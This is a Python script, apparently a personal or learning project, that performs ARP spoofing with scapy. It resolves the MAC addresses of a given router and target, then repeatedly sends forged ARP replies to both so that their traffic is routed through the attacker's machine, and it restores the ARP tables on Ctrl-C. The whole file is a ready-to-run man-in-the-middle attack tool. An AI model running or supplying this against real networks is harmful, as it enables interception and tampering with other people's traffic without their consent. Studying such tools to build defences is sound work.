#! usr/bin/env python3

"""
* Author:               Job Jacob
* Created:              30 November 2020 
* Filename:             arp_spoofer.py
* Example Run (Linux):  python3 arp_spoofer.py -r 192.168.1.1 -t 192.168.1.2
"""

import time
import argparse
import scapy.all as scapy

""" 
* Function Name:  print_sample_usage_msg()
* Input:          None
* Output:         None
* Logic:          The function just prints a message on how to run the script with the required arguments.
* Example Call:   print_sample_usage_msg()
"""
def print_sample_usage_msg():
    print("\nSAMPLE USAGE:")
    print("If the router IP is 192.168.1.1 and target IP is 192.168.1.2, then run the script as:")
    print("python3 " + __file__ + " -r 192.168.1.1 -t 192.168.1.2\n")

""" 
* Function Name:  get_arp_spoofer_args()
* Input:          None
* Output:         args.router (string): IP address of router.
*                 args.target (string): IP address of target device.
* Logic:          The function parses the parameters passed to the script and verifies if all the required parameters are present.
* Example Call:   router_ip, target_ip = get_arp_spoofer_args()
"""
def get_arp_spoofer_args():
    parser = argparse.ArgumentParser()                                  
    parser.add_argument("-r", "--router", type=str, help="IP address of the router (required)")
    parser.add_argument("-t", "--target", type=str, help="IP address of the target device (required)")

    args = parser.parse_args()
    
    if((args.router == None) and (args.target == None)):
        print("\nError: Router and target IPs missing!! Pass the router IP and IP of target device as an argument to the script.")
        print_sample_usage_msg()

    elif(args.router == None):
        print("\nError: Router IP missing!! Pass the IP address of the router as an argument to the script.")
        print_sample_usage_msg()

    elif(args.target == None):
        print("\nError: Target IP missing!! Pass the IP address of the target device as an argument to the script.")
        print_sample_usage_msg()

    return args.router, args.target

""" 
* Function Name:  validate_ip()
* Input:          ip (string): The given target/router IP which needs to be validated.
* Output:         1 if the IP is valid or else 0  
* Logic:          The function checks whether the given IP is valid or not by splitting and validating each part of the input IP.
* Example Call:   valid_ip = validate_ip("192.168.1.1")
"""
def validate_ip(ip):
    ip_parts = ip.split('.')

    if len(ip_parts) != 4:
        return 0
    else:
        for part in ip_parts:
            if(0 <= int(part) <= 255):
                continue
            else:
                return 0

    return 1

""" 
* Function Name:  get_mac()
* Input:          ip (string): The IP address of the device.
* Output:         mac (string): The MAC address of the device.
* Logic:          The function sends ARP request to a device and receives back packets containing the MAC address of the device.
* Example Call:   mac = get_mac("192.168.1.1")
"""
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    reply = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    if(len(reply) == 0):
        print("\nERROR: The IP " + ip + " is not live / not accessible. Please pass a valid IP address.\n")
        return None
    
    elif(len(reply) == 1):
        mac = reply[0][1].hwsrc

    return mac

""" 
* Function Name:  spoof_arp()
* Input:          target_ip (string): IP address of target.
*                 target_mac (string): MAC address of the target.
*                 spoof_ip (string): IP address of the other device.
* Output:         None
* Logic:          The function performs ARP spoofing by making the IP address of the source device look like that of some other device 
*                 thereby leading to the ARP table of the target device being modified.
* Example Call:   spoof_arp("192.168.1.1", "00:11:22:33:44:55", "192.168.1.2")
"""
def spoof_arp(target_ip, target_mac, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

""" 
* Function Name:  restore_arp_table()
* Input:          target_ip (string): IP address of target.
*                 target_mac (string): MAC address of the target.
*                 source_ip (string): IP address of the other device.
*                 source_mac (string): MAC address of the other device.
* Output:         None
* Logic:          The function restores back the actual IP and MAC address of the other device in the ARP table of the target device.
* Example Call:   restore_arp_table("192.168.1.1", "00:11:22:33:44:55", "192.168.1.2", "11:22:33:44:55:66")
"""
def restore_arp_table(target_ip, target_mac, source_ip, source_mac):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)


if __name__ == "__main__":
    router_ip, target_ip = get_arp_spoofer_args()

    if((router_ip != None) and (target_ip != None)):
        valid_router_ip = validate_ip(router_ip)
        valid_target_ip = validate_ip(target_ip)

        if((valid_router_ip) and (valid_target_ip)):
            router_mac = get_mac(router_ip)
            target_mac = get_mac(target_ip)

            if((router_mac != None) and (target_mac != None)):
                print("\nStarting to SPOOF...\n")

                sent_packets = 0
                try:
                    while True:
                        spoof_arp(target_ip, target_mac, router_ip)
                        spoof_arp(router_ip, router_mac, target_ip)

                        sent_packets += 2
                        print("\rPackets Sents: " + str(sent_packets), end="")

                        time.sleep(2)

                except KeyboardInterrupt: 
                    print("\n\nStopping SPOOF...") 
                    print("Restoring ARP Tables...")

                    restore_arp_table(target_ip, target_mac, router_ip, router_mac)
                    restore_arp_table(router_ip, router_mac, target_ip, target_mac)

                    print("\nDONE.\n")

        else:
            if(not valid_router_ip):
                print("\nERROR: Invalid router IP!! Please pass a valid router IP.\n")
            elif(not valid_target_ip):
                print("\nERROR: Invalid target IP!! Please pass a valid target IP.\n")